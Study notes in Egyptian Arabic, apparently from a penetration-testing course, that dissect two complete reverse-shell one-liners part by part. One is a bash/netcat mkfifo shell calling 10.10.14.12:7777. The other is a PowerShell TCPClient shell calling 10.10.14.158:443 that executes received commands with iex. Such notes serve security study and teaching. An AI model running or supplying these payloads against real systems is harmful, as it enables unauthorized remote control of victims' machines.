- الpaylaod ده عباره رسالة فيها اوامر بتexploit ثغرة معينه فالOS او ف ابلكيشن معين
- الكود او الاوامر اللي بتكون فالpayload دي بتنفذ malicious action زي ما شوفنا فالreverse shells وال bind
- خلي بالك الwin defender بيوقف الexecution بتاع البايلود ده لأن ده malicious code
----
## One-Liners Examined
#### Netcat/Bash Reverse Shell One-liner

```shell-session
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```
#### Remove /tmp/f

```shell-session
rm -f /tmp/f; 
```
- هنا بيمسح الملف `/tmp/f` لو موجود يعني
- ال`f-` يعني بتقوله تجاهل وجود الملف حتي لو الملف مش موجود اصلا يعني امسح وخلاص ولو الملف مش موجود كمل من غير error
- ال`;` بتفصل بين اوامر متعدده علي نفس السطر
#### Make A Named Pipe

```shell-session
mkfifo /tmp/f; 
```
- الأمر ده بينشئلي fifo في المسار اللي مديهوله ده
- الFIFO ده هو ملف خاص يسمح لعملية بتكابة بيانات وتانية تقرأها بشكل متزامن كقناة تواصل بين العمليات
تخيّل إنك واقف قدّام **ماسورة** (Pipe) لها **اسم** وموجودة على الجهاز، وأي برنامج يقدر:

- يبعت بيانات فيها
    
- أو يستقبل بيانات منها
    

من غير ما يعرف البرنامج اللي على الناحية التانية بيعمل إيه.

الماسورة دي بتشتغل بنظام **“اللي يدخل الأول يطلع الأول”** → وده معنى FIFO.

###### مثال بسيط جدًا يخليك تفهم الفكرة:

تخيّل عندك ماسورة اسمها:

`/tmp/f`

برنامج A يكتب فيها  
برنامج B يقرأ منها

زي بالظبط ما تكون سايب "رسالة" في ماسورة، وأي حد يفتح الناحية التانية يقرأ الرسالة.

###### طيب هنا إيه الفرق بينها وبين الملف العادي؟

## ملف عادي:

- اللي جوّاه **بيتخزن**
    
- تقفله → يفضل موجود بنفس المحتوى
    

###### FIFO:

- **مش بتخزّن بيانات!**  
    يعني البيانات تفضل جواها لحد ما تتقري وبس، بعد كده تختفي.
    
- ولازم يكون فيه حد بيكتب وحد بيقرأ  
    لو واحد بس → العملية تتعلّق (Hang)

###### طيب ليه بنستخدم FIFO في الـ Reverse Shell؟

السطر ده:

`mkfifo /tmp/f cat /tmp/f | bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f`

بيعمل إيه؟

###### 1) يعمل ماسورة اسمها /tmp/f

`mkfifo /tmp/f`

###### 2) أي حاجة بتيجي من الـ netcat → تتحط في الـ FIFO

والbash ياخدها وينفذها  
وأي حاجة تطلع من bash → تترمي للـ netcat.

يعني خلّقنا **دورة كلام بينك وبين الباش** عن طريق الماسورة دي.

باختصار:

الـ FIFO = الوسيط اللي بيربط الاتنين ببعض.

###### ليه مش نكتب كل ده من غير FIFO؟

لإن الباش محتاج source يقرأ منه الأوامر،  
والـ netcat محتاج حد يبعته بيانات.

فبدل ما تعمل ملف عادي، بنعمل FIFO (ماسورة مؤقتة) بتعدّي البيانات رايح جاي
#### Output Redirection

```shell-session
cat /tmp/f | 
```
- هنا بقرأ البيانات من الfifo وبطبعها علي الstdout
- ال`|` يعني بقوله الoutput اللي هيطلع من الcommand ده حطو ف input الcommand اللي بعديه
#### Set Shell Options

```shell-session
/bin/bash -i 2>&1 | 
```
- اول حاجه `/bin/bash` دي عملية فتح الشيل
- ال`i-` معناها اني بقولو ان الshell يبقي interactive
- ال `2>&1` بقولو ان الerror stream وهو ال2 والoutput stram اللي هو 1 يحصلهم redirect للي بعد الpipe line دي
#### Open a Connection with Netcat

```shell-session
nc 10.10.14.12 7777 > /tmp/f  
```
- هنا بقي بفتح اتصال مع الهوست ده والبورت المعين برضو اللي مديهوله
- ال`<` يعني الoutput اللي هيطلع حطو فال`/tmp/f`
---
---

## PowerShell One-liner Explained
- زي ما احنا عارفين ان الpayload بيختلف من os ل os واحنا فوق عرفنا ازاي نعمل الكلام ده علي اللينكس وهنا هنتعلم ازاي نعملها عالويندوز
#### Powershell One-liner

```cmd-session
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
#### Calling PowerShell

```cmd-session
powershell -nop -c 
```
- اول حاجه اني بعمل calling للpowershell
- بقولو هنا execute الpowershell من غير بروفايل (nop) وشغل الاسكريبت اللي جوا الquotes (-c)
- خلي بالك لما تيجي تاخد RCE علي ويندوز الRCE بتديك امكانيه انك تشغل الأوامر علي cmd بس فا احنا عشان نحل المشكله دي نستخدم الcmd ونجبره يشغل powershell
#### Binding A Socket

```cmd-session
"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443)
```
- بيكون في متغير اسمه `$client` وهنديلو new object
- ال`System.Net.Sockets.TCPClient` ده .NET framework object
- وظيفة الobject ده انه يكونكت بالtcp socket اللي جوا الأقواس (10.10.14.158,443)
#### Setting The Command Stream

```cmd-session
$stream = $client.GetStream();
```
- الGetStream هنا هو بس بيسهل الnetwork communications
#### Empty Byte Stream

```cmd-session
[byte[]]$bytes = 0..65535|%{0}; 
```
- هنا بنعمل متغيّر اسمه `$bytes` من نوع مصفوفة بايت `byte[]`.
- بنستخدم `0..65535` عشان نولد أرقام من 0 لـ 65535، وبعدين `| % { 0 }` (يعني ForEach) بنحوّل كل رقم إلى الصفر `0`.
- النتيجة: مصفوفة كبيرة فيها 65,536 عنصر (0 إلى 65535) وكل عنصر قيمته صفر — كأنها “تيّار بايت فاضي” جاهز يستلم بيانات.
- الهدف: نجهّز “مخزن” بيانات ثابت (buffer) عشان نستلم أو نكتب فيه بيانات الشبكة.bytes
#### Stream Parameters

```cmd-session
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
```
- بنبدأ `while` (دايمًا) طالما القراءة من الستريم نجحت (يعني عدد البايتات المقروءة مش صفر).
- `$i = $stream.Read($bytes, 0, $bytes.Length)` → معناه: من كائن الستريم (`$stream`) نقرأ بيانات ونخزنها في المصفوفة `$bytes` ابتداءً من الموضع 0، وبحد أقصى طول المصفوفة `$bytes.Length`.
- إذا `Read()` رجّعت صفر، معناها إن مافيش بيانات أكتر أو الاتصال اتقطع، فالحلقة تنتهي
- (المتغيّر `$i` بيحمل عدد البايتات اللي اتقرأت فعليًا).
#### Set The Byte Encoding

```cmd-session
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
```
- `New‑Object -TypeName System.Text.ASCIIEncoding` → كائن جديد من فئة ASCII Encoding، يعني هنستخدمها لتحويل البايتات لنص “ASCII”.
- `.GetString($bytes, 0, $i)` → من المصفوفة `$bytes` من الموضع 0 إلى `$i` بايت، بنحوّلها إلى سلسلة نصية `$data`.
- بمعنى: البيانات اللي قريناها من الستريم بنحولها لحروف نصية (مش مجرد أصفار أو بايتات غير مفهومة).
- الشرط `{;` هو فقط للتأكيد إن الكلام بيتنفّذ بتسلسل (مش مهم جدًا بس موجود).
#### Invoke-Expression

```cmd-session
$sendback = (iex $data 2>&1 | Out-String ); 
```
- `iex $data` → `Invoke-Expression` بتنفّذ النص اللي في `$data` كأمر PowerShell. يعني أي أمر جالك من الشبكة بيتنفّذ.
- `2>&1` → إعادة توجيه “خطأ” (stderr) إلى “مخرجات عادية” (stdout)، يعني لو الأمر فشل أو فيه خطأ يبقى مع المخرجات.
- `| Out-String` → بتحول الناتج (سواء مخرجات أو أخطاء) لسلسلة نصية.
- وبكدة `$sendback` بيحتوي نص النتيجة من تنفيذ الأمر.
- **تحذير:** ده يعتبر “شل” (shell) عكسي أو مترابط مع الـ listener — ده خطير جدًا لو حصل في بيئة مش مؤمّنة.
#### Show Working Directory

```cmd-session
$sendback2 = $sendback + 'PS ' + (pwd).path + '> '; 
```
-  بتجيب المسار الحالي في PowerShell (مثلاً `C:\Users\mypc`).
- `'PS ' + (pwd).path + '> '` → نص زي `PS C:\Users\mypc>` عشان يظهر كـ prompt.
- `$sendback2` بيكون ناتج تنفيذ الأمر زائد البريمبت، علشان الطرف التاني يشوف إن “السيستم” جاهز لأمر جديد.
#### Sets Sendbyte

```cmd-session
$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
```
- `([text.encoding]::ASCII).GetBytes($sendback2)` → بنحوّل النص `$sendback2` لمصفوفة بايتات (ASCII).
- `$stream.Write($sendbyte, 0, $sendbyte.Length)` → نكتب البايتات دي في الـ network stream ابتداءً من الموضع 0 ولحد الطول.
- `$stream.Flush()` → بنفرّغ البافر (buffer) عشان تتأكد البيانات اتبعتت فعليًا.
- يعني: بعد تنفيذ الأمر، النتيجة + البريمبت بتنبعت للطرف المُتصّل.
#### Terminate TCP Connection

```cmd-session
$client.Close()"
```

- `$client` هو كائن الـ TcpClient (أو نفس الـ listener لو bind) — بنقفله مع نهاية الجلسة.
- يعني لما الاتصال ينتهي أو الحلقة تخلص، بنقفل العميل (client) عشان ننضّف الموارد
---
